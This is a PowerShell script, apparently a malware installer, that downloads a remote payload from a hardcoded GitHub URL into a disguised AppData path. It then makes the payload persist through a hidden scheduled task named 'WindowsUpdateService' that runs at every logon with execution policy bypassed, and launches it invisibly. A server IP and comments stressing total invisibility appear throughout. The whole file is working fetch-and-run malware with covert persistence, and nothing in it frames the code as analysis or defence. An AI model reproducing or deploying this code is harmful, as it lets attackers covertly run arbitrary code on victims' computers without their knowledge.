# bootstrap.ps1 - Headless persistent installer (NO VISIBILITY)
$ErrorActionPreference = 'SilentlyContinue'

# Configuration (UPDATE THIS WITH YOUR ARCH IP)
$serverIP = "147.185.221.31"
$localPayloadPath = "$env:APPDATA\Microsoft\Windows\batch.ps1"
$payloadUrl = "https://raw.githubusercontent.com/JoshBeCute/letssee/main/batch.ps1"

# 1. Download main payload if missing or forced update
$isUpdate = $args -contains "-update"
if (-not (Test-Path $localPayloadPath) -or $isUpdate) {
    try {
        (New-Object Net.WebClient).DownloadFile($payloadUrl, $localPayloadPath)
        Write-Host "✓ Payload updated successfully" -ForegroundColor Green
    }
    catch {
        if (-not (Test-Path $localPayloadPath)) {
            Write-Host "❌ Failed to download payload. Using local copy if available..." -ForegroundColor Red
            exit
        }
    }
}

# 2. CREATE TRULY HIDDEN SCHEDULED TASK (KEY FIX)
$taskName = "WindowsUpdateService"

# Get current user's SID (critical for per-user tasks)
$userSid = (Get-WmiObject Win32_UserAccount -Filter "Name='$env:USERNAME'").SID

# Delete existing task if it exists (clean setup)
Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue

# Create headless task configuration
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument `
    "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$localPayloadPath`""

$trigger = New-ScheduledTaskTrigger -AtLogOn -UserId $userSid

$principal = New-ScheduledTaskPrincipal -UserId $env:USERDOMAIN\$env:USERNAME `
    -LogonType Interactive -RunLevel Limited

# CRITICAL: Enable HIDDEN mode at task level (no window flicker)
$settings = New-ScheduledTaskSettingsSet -Hidden -StartWhenAvailable -DontStopIfGoingOnBatteries

# Register the task
Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger `
    -Principal $principal -Settings $settings -Force | Out-Null

Write-Host "✓ Persistence established (COMPLETELY HIDDEN)" -ForegroundColor Green

# 3. Run payload immediately (hidden) if not running
if (-not (Get-Process -Name "powershell" -ErrorAction SilentlyContinue | 
    Where-Object { $_.Path -eq $localPayloadPath })) {
    
    # Start hidden using same parameters as scheduled task
    Start-Process powershell.exe -ArgumentList `
        "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$localPayloadPath`"" `
        -WindowStyle Hidden -CreationFlags 8 # CREATE_NO_WINDOW (0x08)
    
    Write-Host "✓ Payload started (INVISIBLE)" -ForegroundColor Green
}
else {
    Write-Host "✓ Payload already running" -ForegroundColor Yellow
}
